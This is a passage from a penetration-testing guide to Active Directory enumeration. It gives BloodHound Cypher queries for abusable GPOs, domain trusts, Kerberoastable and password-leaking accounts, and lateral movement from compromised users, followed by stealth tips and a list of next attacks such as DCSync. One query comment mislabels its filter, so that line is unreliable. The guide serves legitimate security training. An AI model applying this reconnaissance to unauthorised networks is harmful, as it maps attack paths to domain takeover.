// Owned users with sessions on accessible computers
MATCH (owned:User {owned:true})-[:AdminTo]->(c:Computer),
(target:User)-[:HasSession]->(c)
WHERE NOT target.owned
RETURN owned.name, c.name, COLLECT(target.name)
```

### 11.8 GPO Abuse

```cypher
// GPOs controlled by non-admins
MATCH (u:User)-[r:GenericAll|GenericWrite|Owns]->(g:GPO)
WHERE NOT u.highvalue
RETURN u,r,g

// GPOs affecting Domain Controllers
MATCH (g:GPO)-[:GPOLink]->(ou:OU)
WHERE ou.name CONTAINS 'DOMAIN CONTROLLERS'
RETURN g.name

// Writable GPOs
MATCH (u:User)-[r:GenericAll|GenericWrite|Owns|WriteDacl]->(g:GPO)
RETURN u.name, g.name, TYPE(r)

// GPOs with most links
MATCH (g:GPO)-[:GPOLink]->(ou:OU)
RETURN g.name, COUNT(ou) as LinkCount
ORDER BY LinkCount DESC
```

### 11.9 Trust Relationships

```cypher
// All domain trusts
MATCH (d:Domain)-[r:TrustedBy]->(d2:Domain) RETURN d,r,d2

// Bidirectional trusts
MATCH (d1:Domain)-[:TrustedBy]->(d2:Domain)-[:TrustedBy]->(d1) RETURN d1,d2

// External trusts
MATCH (d:Domain)-[r:TrustedBy {trusttype:'External'}]->(d2:Domain) RETURN d,r,d2

// Users from trusted domains in high-value groups
MATCH (u:User)-[:MemberOf]->(g:Group {highvalue:true})
WHERE NOT u.domain = g.domain
RETURN u.name, g.name, u.domain, g.domain
```

### 11.10 Quick Wins

```cypher
// Low-hanging fruit: Owned principals to DA in <= 3 hops
MATCH (u {owned:true}), (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),
p=shortestPath((u)-[*1..3]->(g))
RETURN p

// Users with password in description
MATCH (u:User)
WHERE u.description CONTAINS 'pass' OR u.description CONTAINS 'pwd'
RETURN u.name, u.description

// Enabled users with password never expires
MATCH (u:User {enabled:true, passwordnotreqd:true}) RETURN u

// Computers with admin from Everyone/Authenticated Users
MATCH (g:Group)-[:AdminTo]->(c:Computer)
WHERE g.name CONTAINS 'EVERYONE' OR g.name CONTAINS 'AUTHENTICATED USERS'
RETURN g.name, c.name

// All outbound ACLs from owned principals
MATCH (u {owned:true})-[r]->(t)
WHERE r.isacl=true
RETURN u.name, TYPE(r), t.name, t.highvalue

// High-value targets with no admin count
MATCH (u:User {highvalue:true})
WHERE NOT u.admincount
RETURN u.name

// Kerberoastable high-value users
MATCH (u:User {hasspn:true, highvalue:true})
RETURN u.name, u.serviceprincipalnames
```

### 11.11 Lateral Movement Paths

```cypher
// Find all paths for lateral movement from owned
MATCH (u {owned:true})-[:CanRDP|CanPSRemote|ExecuteDCOM|SQLAdmin|AdminTo*1..3]->(c:Computer)
RETURN u.name, c.name

// RDP access from owned
MATCH (u {owned:true})-[:CanRDP]->(c:Computer) RETURN u,c

// PSRemote access from owned
MATCH (u {owned:true})-[:CanPSRemote]->(c:Computer) RETURN u,c

// DCOM access paths
MATCH (u {owned:true})-[:ExecuteDCOM]->(c:Computer) RETURN u,c

// SQL Admin rights
MATCH (u {owned:true})-[:SQLAdmin]->(c:Computer) RETURN u,c

// Hop from owned computer to other computers
MATCH (c1:Computer {owned:true}), (c2:Computer),
p=shortestPath((c1)-[*1..]->(c2))
WHERE c1 <> c2
RETURN p LIMIT 25
```

---

## Conclusion

Active Directory enumeration is a critical phase in understanding the security posture of a Windows environment. This guide covered comprehensive techniques from basic domain discovery to advanced attack path identification using modern tools and methodologies.

### Key Takeaways:

1. **Layered Approach:** Always enumerate in phases - start broad, then focus on high-value targets
2. **Tool Diversity:** Combine multiple tools (PowerView, BloodHound, Impacket) for complete coverage
3. **Stealth Matters:** Use LDAP over SMB when possible, throttle requests, blend with normal traffic
4. **ACLs are Gold:** Misconfigured permissions often provide easier paths than credential attacks
5. **Document Everything:** Keep detailed notes of your enumeration findings for reporting and analysis

### Recommended Workflow:

```
1. Initial Recon → Domain structure, DCs, trusts
2. User/Group Enum → Privileged accounts, Kerberoastable users
3. Computer Enum → Servers, delegation issues, old OS
4. ACL Analysis → GenericAll, WriteDacl, exploitable permissions
5. BloodHound → Visual attack paths, quick wins
6. GPO Review → Writable GPOs, vulnerable configs
7. Attack Path Selection → Choose most feasible path based on access and stealth requirements
```

### Continuous Learning:

- Stay updated with new AD attack techniques (ADCS, Azure AD integration, etc.)
- Practice in lab environments (GOAD, BadBlood, Purple Knight)
- Follow security researchers: Will Schroeder (@harmj0y), Sean Metcalf (@PyroTek3), Charlie Bromberg (@_nwodtuhs)
- Read Microsoft security advisories for new mitigations

### Next Steps:

After enumeration, typical attack progression:
1. Kerberoasting / AS-REP roasting for credential access
2. ACL abuse for privilege escalation
3. Unconstrained delegation exploitation
4. GPO manipulation
5. DCSync for domain persistence

---

## References and Resources

**Tools:**
- BloodHound: https://github.com/BloodHoundAD/BloodHound
- PowerView: https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
- Impacket: https://github.com/SecureAuthCorp/impacket
- CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec
- PingCastle: https://www.pingcastle.com/

**Learning Resources:**
- SpecterOps Blog: https://posts.specterops.io/
- HackTricks AD: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- Pentester Academy: Active Directory Lab
- CRTP/CRTE Certifications

**Detection Resources:**
- Sigma Rules: https://github.com/SigmaHQ/sigma
- Palantir Windows Event Forwarding: https://github.com/palantir/windows-event-forwarding
- HELK: https://github.com/Cyb3rWard0g/HELK

**MITRE ATT&CK:**
- Discovery Tactics: https://attack.mitre.org/tactics/TA0007/
- Credential Access: https://attack.mitre.org/tactics/TA0006/

---

**Document Version:** 1.0
**Last Updated:** 2025-01-09
**Target Audience:** Penetration Testers, Red Teamers, Security Researchers
**Environment:** Windows Active Directory 2016-2022, Hybrid Azure AD
